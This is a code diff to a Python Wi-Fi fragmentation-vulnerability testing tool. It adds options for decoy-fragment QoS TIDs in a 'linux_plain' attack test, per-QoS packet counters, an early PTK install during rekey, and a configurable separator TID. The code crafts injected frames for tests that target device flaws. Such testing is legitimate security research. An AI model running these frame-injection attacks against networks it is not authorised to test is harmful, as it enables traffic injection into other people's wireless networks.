@@ -321,15 +321,17 @@ class PingTest(Test):
 				self.actions.insert(i, sep_frag)
 
 class LinuxTest(Test):
-	def __init__(self, ptype):
+	def __init__(self, ptype, decoy_tid=None):
 		super().__init__([
-			Action(Action.Connected, Action.GetIp), # XXX we don't always want to wait on this?
+			# Note: to inject immediately after 4-way provide IPs using --ip and --peerip
+			Action(Action.Connected, Action.GetIp),
 			Action(Action.Connected, enc=True),
 			Action(Action.Connected, enc=True),
 			Action(Action.Connected, enc=False)
 		])
 		self.ptype = ptype
 		self.check_fn = None
+		self.decoy_tid = decoy_tid
 
 	def check(self, p):
 		if self.check_fn == None:
@@ -345,8 +347,17 @@ class LinuxTest(Test):
 
 		# Fragment 2: make Linux update latest used crypto Packet Number. Use a dummy packet
 		# that can't accidently aggregate with the first fragment in a corrrect packet.
-		p = station.get_header()/LLC()/SNAP()/IP()/Raw(b"linux_plain decoy fragment")
+		p = station.get_header(prior=2)/LLC()/SNAP()/IP()/Raw(b"linux_plain decoy fragment")
 		p.SC = frag2.SC ^ (1 << 4)
+
+		# - In the attack against Linux, the decoy frame must have the same QoS TID.
+		# - On the other hand, some devices seem to only cache fragments for one sequence
+		#   number per QoS priority. So to avoid overwriting the first fragment, add this
+		#   option to use a different priority for it.
+		p.TID = 2
+		if self.decoy_tid != None:
+			p.TID = 3
+
 		self.actions[1].frame = p
 
 		# Fragment 3: can now inject last fragment as plaintext
@@ -458,7 +469,7 @@ class Station():
 
 		# Don't reset PN to have consistency over rekeys and reconnects
 		self.reset_keys()
-		self.pn = 0x100
+		self.pn = [0x100] * 16
 
 		# Contains either the "to-DS" or "from-DS" flag.
 		self.FCfield = Dot11(FCfield=ds_status).FCfield
@@ -572,8 +583,8 @@ class Station():
 		return header
 
 	def encrypt(self, frame, inc_pn=1, force_key=None):
-		# TODO: Option to use per-QoS transmit replay counters?
-		self.pn += inc_pn
+		idx = dot11_get_priority(frame) if self.options.pn_per_qos else 0
+		self.pn[idx] += inc_pn
 
 		key, keyid = (self.tk, 0) if int(frame.addr1[1], 16) & 1 == 0 else (self.gtk, self.gtk_idx)
 		if force_key == 0:
@@ -581,9 +592,9 @@ class Station():
 			key = b"\x00" * len(key)
 
 		if len(key) == 16:
-			encrypted = encrypt_ccmp(frame, key, self.pn, keyid)
+			encrypted = encrypt_ccmp(frame, key, self.pn[idx], keyid)
 		else:
-			encrypted = encrypt_wep(frame, key, self.pn, keyid)
+			encrypted = encrypt_wep(frame, key, self.pn[idx], keyid)
 
 		return encrypted
 
@@ -906,7 +917,11 @@ class Authenticator(Daemon):
 
 	def rekey(self, station):
 		log(STATUS, f"Starting PTK rekey with client {station.get_peermac()}", color="green")
-		wpaspy_command(self.wpaspy_ctrl, "REKEY_PTK " + station.get_peermac())
+		cmd = f"REKEY_PTK {station.get_peermac()}"
+		if self.options.rekey_early_install:
+			log(STATUS, "Will install PTK during rekey after sending Msg4")
+			cmd += " early-install"
+		wpaspy_command(self.wpaspy_ctrl, cmd)
 
 	def reconnect(self, station):
 		# Confirmed to *instantly* reconnect: Arch Linux, Windows 10 with Intel WiFi chip, iPad Pro 13.3.1
@@ -1242,10 +1257,12 @@ def prepare_tests(test_name, stractions, delay=0, inc_pn=0, as_msdu=None, ptype=
 		test = PingTest(REQ_ICMP, actions, as_msdu=as_msdu, bcast=bcast)
 
 	elif test_name == "ping_frag_sep":
-		# Check if we can send frames in between fragments. The seperator uses a different QoS TID.
-		# The second fragment must use an incremental PN compared to the first fragment. So this
-		# also tests if the receivers uses a per-QoS receive replay counter.
-		separator = Dot11(type="Data", subtype=8, SC=(33 << 4) | 0)/Dot11QoS(TID=1)/LLC()/SNAP()
+		# Check if we can send frames in between fragments. The seperator by default uses a different
+		# QoS TID. The second fragment must use an incremental PN compared to the first fragment.
+		# So this also tests if the receivers uses a per-QoS receive replay counter. By overriding
+		# the TID you can check whether fragments are cached for multiple sequence numbers in one TID.
+		tid = 1 if stractions == None else int(stractions)
+		separator = Dot11(type="Data", subtype=8, SC=(33 << 4) | 0)/Dot11QoS(TID=tid)/LLC()/SNAP()
 		test = PingTest(REQ_ICMP,
 				[Action(Action.Connected, action=Action.GetIp),
 				 Action(Action.Connected, enc=True),
@@ -1283,7 +1300,8 @@ def prepare_tests(test_name, stractions, delay=0, inc_pn=0, as_msdu=None, ptype=
 		test = EapolMsduTest(REQ_ICMP, actions)
 
 	elif test_name == "linux_plain":
-		test = LinuxTest(REQ_ICMP)
+		decoy_tid = None if stractions == None else int(stractions)
+		test = LinuxTest(REQ_ICMP, decoy_tid)
 
 	elif test_name == "macos":
 		if stractions != None:
@@ -1328,7 +1346,7 @@ def prepare_tests(test_name, stractions, delay=0, inc_pn=0, as_msdu=None, ptype=
 	# If requested, override the ptype
 	if ptype != None:
 		if not hasattr(test, "ptype"):
-			log(WARNING, "Cannot override request type of this test.")
+			log(WARNING, "Cannot override request type of the selected test.")
 			quit(1)
 		test.ptype = ptype
 
@@ -1359,7 +1377,7 @@ def args2msdu(args):
 
 
 if __name__ == "__main__":
-	log(WARNING, "Remember to use a modified backports and ath9k_htc firmware!\n")
+	log(WARNING, "Remember to use a modified backports and ath9k_htc firmware!")
 
 	parser = argparse.ArgumentParser(description="Test for fragmentation vulnerabilities.")
 	parser.add_argument('iface', help="Interface to use for the tests.")
@@ -1378,8 +1396,10 @@ if __name__ == "__main__":
 	parser.add_argument('--icmp', default=False, action='store_true', help="Override default request with ICMP ping request.")
 	parser.add_argument('--rekey-request', default=False, action='store_true', help="Actively request PTK rekey as client.")
 	parser.add_argument('--rekey-plaintext', default=False, action='store_true', help="Do PTK rekey with plaintext EAPOL frames.")
+	parser.add_argument('--rekey-early-install', default=False, action='store_true', help="Install PTK after sending Msg3 during rekey.")
 	parser.add_argument('--full-reconnect', default=False, action='store_true', help="Reconnect by deauthenticating first.")
-	parser.add_argument('--bcast', default=False, action='store_true', help="Send pings using broadcast receiver address.")
+	parser.add_argument('--bcast', default=False, action='store_true', help="Send pings using broadcast receiver address (addr1).")
+	parser.add_argument('--pn-per-qos', default=False, action='store_true', help="Use separate Tx packet counter for each QoS TID.")
 	args = parser.parse_args()
 
 	ptype = args2ptype(args)
@@ -1393,7 +1413,9 @@ if __name__ == "__main__":
 	options.peerip = args.peerip
 	options.rekey_request = args.rekey_request
 	options.rekey_plaintext = args.rekey_plaintext
+	options.rekey_early_install = args.rekey_early_install
 	options.full_reconnect = args.full_reconnect
+	options.pn_per_qos = args.pn_per_qos
 
 	# Parse remaining options
 	global_log_level -= args.debug
